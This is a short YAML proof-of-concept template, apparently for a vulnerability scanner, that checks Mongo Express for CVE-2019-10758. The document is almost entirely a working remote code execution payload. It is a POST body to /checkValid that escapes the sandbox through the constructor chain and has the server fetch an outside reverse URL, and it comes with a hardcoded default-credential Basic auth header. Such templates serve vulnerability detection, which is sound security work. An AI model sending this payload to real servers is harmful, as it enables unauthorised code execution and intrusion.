detail:
  author: fnmsd(https://github.com/fnmsd)
  description: Mongo Express CVE-2019-10758 Code Execution
  links:
  - https://github.com/masahiro331/CVE-2019-10758
  - https://www.twilio.com/blog/2017/08/http-requests-in-node-js.html
  vulnpath: /checkValid
expression: r0()
manual: true
name: poc-yaml-mongo-express-cve-2019-10758
rules:
  r0:
    expression: reverse.wait(5)
    request:
      body: document=this.constructor.constructor('return process')().mainModule.require('http').get('{{reverseURL}}')
      cache: true
      follow_redirects: true
      headers:
        Authorization: Basic YWRtaW46cGFzcw==
      method: POST
      path: /checkValid
set:
  reverse: newReverse()
  reverseURL: reverse.url
transport: http
